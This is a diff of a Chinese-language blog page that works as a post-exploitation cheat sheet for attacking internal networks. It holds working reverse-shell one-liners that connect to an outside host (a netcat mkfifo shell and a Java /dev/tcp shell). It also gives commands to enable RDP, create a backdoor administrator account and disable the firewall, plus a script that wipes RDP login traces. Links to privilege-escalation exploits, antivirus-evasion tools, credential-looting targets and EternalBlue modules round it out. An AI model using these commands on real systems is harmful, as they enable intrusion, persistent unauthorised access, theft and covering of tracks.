@@ -15,7 +15,7 @@
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="后渗透基础设施分析内网扫描 nmap最高速全端口：1nmap -p 1-65535 -T4 -A --min-rate 2500 --max-retries 0    比较隐蔽：  -PS : nmap向目标主机发送一个设置了SYN标志位的空的TCP报文，不管主机返回SYN/ACK包还是RST包，它都认为该主机存活。不过虽然官方文档上说该参数只关心主机是否存活，不过在当前最新版本的nmap来看，这">
 <meta property="og:locale" content="zh">
-<meta property="og:updated_time" content="2019-06-30T09:16:25.077Z">
+<meta property="og:updated_time" content="2019-08-19T08:52:13.378Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Hexo">
 <meta name="twitter:description" content="后渗透基础设施分析内网扫描 nmap最高速全端口：1nmap -p 1-65535 -T4 -A --min-rate 2500 --max-retries 0    比较隐蔽：  -PS : nmap向目标主机发送一个设置了SYN标志位的空的TCP报文，不管主机返回SYN/ACK包还是RST包，它都认为该主机存活。不过虽然官方文档上说该参数只关心主机是否存活，不过在当前最新版本的nmap来看，这">
@@ -256,31 +256,82 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</span><br></pre></td></tr></table></figure>
 
 <p>Java</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</span><br><span class="line">p.waitFor()</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">### 提权</span><br><span class="line">- [windows](https://github.com/SecWiki/windows-kernel-exploits)</span><br><span class="line">- [linux](https://github.com/SecWiki/linux-kernel-exploits)</span><br><span class="line">- [linux提权辅助](https://github.com/rebootuser/LinEnum)</span><br><span class="line">### 免杀</span><br><span class="line">- [shellter](https://www.shellterproject.com/download/)</span><br><span class="line"></span><br><span class="line">- [K8_SC_ENCODE](https://www.cnblogs.com/k8gege/p/10261491.html)</span><br><span class="line">- [the-backdoor-factory](https://github.com/secretsquirrel/the-backdoor-factory) 给软件捆绑后门</span><br><span class="line"></span><br><span class="line">- [便捷化payload生成](https://github.com/Screetsec/TheFatRat)</span><br><span class="line"></span><br><span class="line">- [Veil-Evasion ](https://github.com/Veil-Framework/Veil-Evasion)</span><br><span class="line">Veil-Evasion是与Metasploit生成相兼容的Payload的一款辅助框架，并可以绕过大多数的杀软</span><br><span class="line"></span><br><span class="line">- [Veil-Evasion不在更新，新版本veil](https://github.com/Veil-Framework/Veil)</span><br><span class="line">- [GreatSCT是以metasploit payload为核心，白名单辅助payload执行框架](https://github.com/GreatSCT/GreatSCT)</span><br><span class="line"></span><br><span class="line">### 维持权限</span><br><span class="line">参考micro8</span><br><span class="line">- 本地后门：如系统后门，这里指的是装机后自带的某 功能或者自带软件后门 </span><br><span class="line">- 本地拓展后门：如iis 6的isapi，iis7的 模块后门 </span><br><span class="line">- 第三方后门：如apache，serv-u，第三方软件后门 </span><br><span class="line">- 第三方扩展后门：如php扩展后门，apache扩展后 门，第三方扩展后门 </span><br><span class="line">- 人为化后门：一般指被动后门，由人为引起触发导致 激活，或者传播，如经典的shift后门</span><br><span class="line"></span><br><span class="line">### 掠夺敏感信息</span><br><span class="line">#### windows：</span><br><span class="line">- [everything搜索文件](https://www.voidtools.com/zh-cn/downloads/)（搜全盘文件，TXT，Excel，word）</span><br><span class="line">- 有道笔记</span><br><span class="line">- 印象笔记</span><br><span class="line">- 浏览器保存的账号密码和历史记录</span><br><span class="line">- 备份文件</span><br><span class="line">- 数据库等敏感配置文件</span><br><span class="line">- 回收站</span><br><span class="line">#### 网段中</span><br><span class="line">- 利用内网dns来获取子域名</span><br><span class="line">- 共享文件</span><br><span class="line">- nas（大部分在5000，5001端口，可通过端口扫描发现）</span><br><span class="line">- gitlab</span><br><span class="line">- svn</span><br><span class="line">- 打印机</span><br><span class="line">- 考勤系统</span><br><span class="line">- 监控系统</span><br><span class="line">- </span><br><span class="line"></span><br><span class="line">### 横向移动</span><br><span class="line">端口爆破：</span><br><span class="line">[hydra](https://github.com/vanhauser-thc/thc-hydra)</span><br><span class="line"></span><br><span class="line">SSH用户名爆破[CVE-2018-15473](https://github.com/Rhynorater/CVE-2018-15473-Exploit)</span><br><span class="line"></span><br><span class="line">ms17-010：</span><br><span class="line"></span><br><span class="line">msf扫描：auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line"></span><br><span class="line">利用：exploit/windows/smb/ms17_010_eternalblue       </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[redis未授权访问](https://blog.csdn.net/fly_hps/article/details/80937837)</span><br><span class="line"></span><br><span class="line">注册表开3389：</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>
 
-<p>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注册表查看远程桌面端口是多少（结果是16进制的）</span><br></pre></td></tr></table></figure>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><ul>
+<li><p><a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener">windows</a></p>
+</li>
+<li><p><a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="noopener">linux</a></p>
+</li>
+<li><p><a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="noopener">linux提权辅助</a></p>
+<h3 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h3></li>
+<li><p><a href="https://www.shellterproject.com/download/" target="_blank" rel="noopener">shellter</a></p>
+</li>
+<li><p><a href="https://www.cnblogs.com/k8gege/p/10261491.html" target="_blank" rel="noopener">K8_SC_ENCODE</a></p>
+</li>
+<li><p><a href="https://github.com/secretsquirrel/the-backdoor-factory" target="_blank" rel="noopener">the-backdoor-factory</a> 给软件捆绑后门</p>
+</li>
+<li><p><a href="https://github.com/Screetsec/TheFatRat" target="_blank" rel="noopener">便捷化payload生成</a></p>
+</li>
+<li><p><a href="https://github.com/Veil-Framework/Veil-Evasion" target="_blank" rel="noopener">Veil-Evasion </a><br>Veil-Evasion是与Metasploit生成相兼容的Payload的一款辅助框架，并可以绕过大多数的杀软</p>
+</li>
+<li><p><a href="https://github.com/Veil-Framework/Veil" target="_blank" rel="noopener">Veil-Evasion不在更新，新版本veil</a></p>
+</li>
+<li><p><a href="https://github.com/GreatSCT/GreatSCT" target="_blank" rel="noopener">GreatSCT是以metasploit payload为核心，白名单辅助payload执行框架</a></p>
+</li>
+</ul>
+<h3 id="维持权限"><a href="#维持权限" class="headerlink" title="维持权限"></a>维持权限</h3><p>参考micro8</p>
+<ul>
+<li>本地后门：如系统后门，这里指的是装机后自带的某 功能或者自带软件后门 </li>
+<li>本地拓展后门：如iis 6的isapi，iis7的 模块后门 </li>
+<li>第三方后门：如apache，serv-u，第三方软件后门 </li>
+<li>第三方扩展后门：如php扩展后门，apache扩展后 门，第三方扩展后门 </li>
+<li>人为化后门：一般指被动后门，由人为引起触发导致 激活，或者传播，如经典的shift后门</li>
+</ul>
+<h3 id="掠夺敏感信息"><a href="#掠夺敏感信息" class="headerlink" title="掠夺敏感信息"></a>掠夺敏感信息</h3><h4 id="windows："><a href="#windows：" class="headerlink" title="windows："></a>windows：</h4><ul>
+<li><a href="https://www.voidtools.com/zh-cn/downloads/" target="_blank" rel="noopener">everything搜索文件</a>（搜全盘文件，TXT，Excel，word）</li>
+<li>有道笔记</li>
+<li>印象笔记</li>
+<li>浏览器保存的账号密码和历史记录</li>
+<li>备份文件</li>
+<li>数据库等敏感配置文件</li>
+<li>回收站<h4 id="网段中"><a href="#网段中" class="headerlink" title="网段中"></a>网段中</h4></li>
+<li>利用内网dns来获取子域名</li>
+<li>共享文件</li>
+<li>nas（大部分在5000，5001端口，可通过端口扫描发现）</li>
+<li>gitlab</li>
+<li>svn</li>
+<li>打印机</li>
+<li>考勤系统</li>
+<li>监控系统</li>
+<li></li>
+</ul>
+<h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><p>端口爆破：<br><a href="https://github.com/vanhauser-thc/thc-hydra" target="_blank" rel="noopener">hydra</a></p>
+<p>SSH用户名爆破<a href="https://github.com/Rhynorater/CVE-2018-15473-Exploit" target="_blank" rel="noopener">CVE-2018-15473</a></p>
+<p>ms17-010：</p>
+<p>msf扫描：auxiliary/scanner/smb/smb_ms17_010</p>
+<p>利用：exploit/windows/smb/ms17_010_eternalblue       </p>
+<p><a href="https://blog.csdn.net/fly_hps/article/details/80937837" target="_blank" rel="noopener">redis未授权访问</a></p>
+<p>注册表开3389：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>
 
-<p>REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server\WinStations\RDP-Tcp /v PortNumber</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">添加用户</span><br></pre></td></tr></table></figure>
+<p>注册表查看远程桌面端口是多少（结果是16进制的）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber</span><br></pre></td></tr></table></figure>
 
-<p>net user admin1 admin1 /add &amp; net localgroup administrators admin1 /add</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">添加允许3389到防火墙</span><br></pre></td></tr></table></figure>
+<p>添加用户</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user admin1 admin1 /add &amp; net localgroup administrators admin1 /add</span><br></pre></td></tr></table></figure>
 
-<p>netsh advfirewall firewall add rule name=”Remote Desktop” protocol=TCP dir=in localport=3389 action=allow</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">关闭防火墙</span><br></pre></td></tr></table></figure>
+<p>添加允许3389到防火墙</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br></pre></td></tr></table></figure>
 
-<p>netsh firewall set opmode mode=disable</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[内网中间人攻击](http://www.myh0st.cn/index.php/archives/230/)</span><br><span class="line"></span><br><span class="line">3389登录记录清除</span><br></pre></td></tr></table></figure>
+<p>关闭防火墙</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall set opmode mode=disable</span><br></pre></td></tr></table></figure>
 
-<p>@echo off<br>@reg delete “HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default” /va /f<br>@del “%USERPROFILE%\My Documents\Default.rdp” /a<br>@exit</p>
-<pre><code>### [传输文件技巧](https://paper.seebug.org/834/)
+<p><a href="http://www.myh0st.cn/index.php/archives/230/" target="_blank" rel="noopener">内网中间人攻击</a></p>
+<p>3389登录记录清除</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">@reg delete &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default&quot; /va /f</span><br><span class="line">@del &quot;%USERPROFILE%\My Documents\Default.rdp&quot; /a</span><br><span class="line">@exit</span><br></pre></td></tr></table></figure>
 
-
-
-
-
-</code></pre>
+<h3 id="传输文件技巧"><a href="#传输文件技巧" class="headerlink" title="传输文件技巧"></a><a href="https://paper.seebug.org/834/" target="_blank" rel="noopener">传输文件技巧</a></h3>
       
 
       
